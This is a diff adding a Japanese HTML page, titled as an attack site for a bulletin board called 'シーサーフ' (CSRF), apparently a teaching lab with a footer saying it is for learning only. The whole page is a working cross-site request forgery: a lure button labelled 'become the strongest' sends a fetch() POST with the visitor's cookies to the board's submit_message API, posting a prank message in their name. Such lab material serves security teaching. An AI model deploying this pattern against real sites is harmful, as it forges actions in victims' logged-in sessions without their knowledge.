@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html>
+	<head lang=ja>
+		<meta charset="utf-8">
+		<title>Web掲示板 "シーサーフ" 攻撃用サイト</title>
+		<style>
+			body {
+				margin: 0;
+				padding: 0;
+			}
+			
+			.container {
+				margin: 0 auto;
+				width: 800px;
+			}
+			
+			main {
+				text-align: center;
+				font-size: 5rem;
+			}
+			
+			#post_evil_message_button {
+				margin: 0 auto;
+				font-size: 5rem;
+				
+				background-color: gray;
+				border-radius: 10px;
+				border-width: 2px;
+				border-color: #ffee00;
+				color: #fff;
+			}
+			
+			footer {
+				margin-top: 2rem;
+			}
+		</style>
+	</head>
+	<body>
+		<div class="container">
+			<header>
+				<h1>Web掲示板 "シーサーフ" 攻撃用サイト</h1>
+			</header>
+
+			<main>
+				<p>最強になれるボタンはこちら↓</p>
+				<div id="post_evil_message_button">最強になる</div>
+			</main>
+
+			<footer>
+				※これは学習目的で作成されました。実際の攻撃には使用しないでください。
+			</footer>
+		</div>
+
+		<script>
+			document.getElementById("post_evil_message_button").addEventListener("click", () => {
+				try {
+					fetch("https://general.csrf-s.internal/api/submit_message", {
+						credentials: "include",
+						method: "post",
+						headers: {
+							'content-type': "application/x-www-form-urlencoded"
+						},
+						body: "content=私は最強になったので、ここにいる全員をハゲにする呪いにかけました。\n夜寝て起きたらツルピカになっていることでしょう。"
+					})
+				} catch {}
+			})
+		</script>
+	</body>
+</html>
